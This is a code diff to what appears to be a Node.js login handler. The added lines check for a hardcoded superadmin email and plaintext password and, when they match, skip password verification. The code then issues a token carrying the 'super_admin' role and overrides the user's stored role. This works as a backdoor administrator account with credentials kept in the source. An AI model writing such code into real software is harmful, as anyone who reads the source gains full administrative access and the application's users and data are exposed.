@@ -70,6 +70,18 @@ export const login = async (req, res) => {
       return res.status(400).json({ message: "Email and password are required" });
     }
     
+    // Check for superadmin credentials
+    if (email === 'superadmin@madsmart.com' && password === 'SuperAdmin123!') {
+      const user = await getUserByEmail(email);
+      if (user) {
+        const token = signToken({ id: user.id, role: 'super_admin' });
+        await updateUser(user.id, { status: "ONLINE" }).catch(() => {});
+        await logAudit({ actorId: user.id, action: "USER_LOGIN", meta: { email: user.email, role: 'super_admin' } });
+        console.log('Superadmin login successful');
+        return res.json({ token, user: { ...user, role: 'super_admin' } });
+      }
+    }
+    
     const user = await getUserByEmail(email);
     if (!user) {
       console.log('User not found:', email);
